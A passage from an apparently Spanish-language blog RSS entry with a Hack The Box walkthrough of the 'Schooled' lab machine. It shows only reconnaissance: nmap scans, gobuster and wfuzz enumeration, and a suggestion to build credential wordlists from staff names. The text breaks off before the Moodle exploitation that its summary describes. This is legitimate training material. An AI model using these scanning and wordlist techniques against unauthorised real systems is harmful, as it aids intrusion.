<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>xss on sckull</title>
    <link>https://sckull.github.io/tags/xss/</link>
    <description>Recent content in xss on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Fri, 10 Sep 2021 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/xss/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Schooled</title>
        <link>https://sckull.github.io/posts/schooled/</link>
        <pubDate>Fri, 10 Sep 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 10 Sep 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/schooled/</guid>
        <description>Schooled presenta Moodle donde encontramos una vulnerabilidad que permite escalar privilegios desde el rol Teacher a Administrator, además, con la manipulacion de permisos e instalacion de un plugin ejecutar comandos en la maquina.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Schooled presenta Moodle donde encontramos una vulnerabilidad que permite escalar privilegios desde el rol Teacher a Administrator, además, con la manipulacion de permisos e instalacion de un plugin ejecutar comandos en la maquina. Creamos un repositorio utilizando PKG y un paquete de instalacion, este ultimo fue modificado para obtener acceso privilegiado.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/335&#34;&gt;Schooled&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;FreeBSD&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.234&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/114053&#34;&gt;TheCyberGeek&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/114053&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[6.5, 6.8, 6, 4, 3.2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[8, 8, 8, 2, 2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra el puerto http (80), ssh (22) y el puerto mysql (33060) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed Apr  7 02:04:59 2021 as: nmap -p- --min-rate 10000 -oN allports 10.129.95.59&lt;/span&gt;
Warning: 10.129.95.59 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.95.59 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.95.59&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.093s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;48317&lt;/span&gt; filtered ports, &lt;span class=&#34;m&#34;&gt;17215&lt;/span&gt; closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
33060/tcp open  mysqlx

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Apr  7 02:06:44 2021 -- 1 IP address (1 host up) scanned in 104.58 seconds&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed Apr  7 02:07:13 2021 as: nmap -p 22,80,33060 -sV -sC -oN serviceports 10.129.95.59&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.129.95.59 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.129.95.59&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.084s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FreeBSD 20200214&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open  http    Apache httpd 2.4.46 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;FreeBSD&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/7.4.15&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.46 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FreeBSD&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; PHP/7.4.15
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Schooled - A new kind of educational institute
33060/tcp open  mysqlx?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Invalid message&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|     HY000
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|   LDAPBindReq: 
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|     *Parse error unserializing protobuf message&amp;#34;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HY000
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   oracle-tns: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Invalid message-frame.&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;|_    HY000
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;# Nmap done at Wed Apr  7 02:07:33 2021 -- 1 IP address (1 host up) scanned in 20.34 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos una pagina estatica en el puerto 80, logramos ver el dominio &lt;code&gt;schooled.htb&lt;/code&gt; en el footer de la pagina el cual agregamos a &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_1.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos, pero solo encontramos las direcciones que se muestran en la pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# gobuster dir -u http://schooled.htb/ -w directory-list-2.3-medium.txt -x php,html,txt,yaml,bak -q -t 50&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/contact.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/about.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/teachers.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos en la pagina &lt;code&gt;/teachers.html&lt;/code&gt; varios nombres y apellidos, lo cual podria servir para crear un diccionario de usuarios y/o contraseñas.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien encontramos informacion importante, mencionan que proveen educacion online en la plataforma Moodle, pero, no encontramos ninguna direccion a moodle con gobuster.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/schooled/Screenshot_2.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;wfuzz---subdominios&#34;&gt;WFUZZ - Subdominios&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;wfuzz&lt;/code&gt; para verificar si existe algun subdominio, vemos que existe &lt;code&gt;moodle.schooled.htb&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/schooled&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
└─$ wfuzz -w /usr/share/wordlists/dirb/common.txt -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host: FUZZ.schooled.htb&amp;#34;&lt;/span&gt; --hh &lt;span class=&#34;m&#34;&gt;20750&lt;/span&gt; --hc &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; -t &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt; 10.129.95.59
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s documentation &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.95.59/
Total requests: &lt;span class=&#34;nv&#34;&gt;4614&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       &lt;span class=&#34;nv&#34;&gt;Payload&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================================&lt;/span&gt;

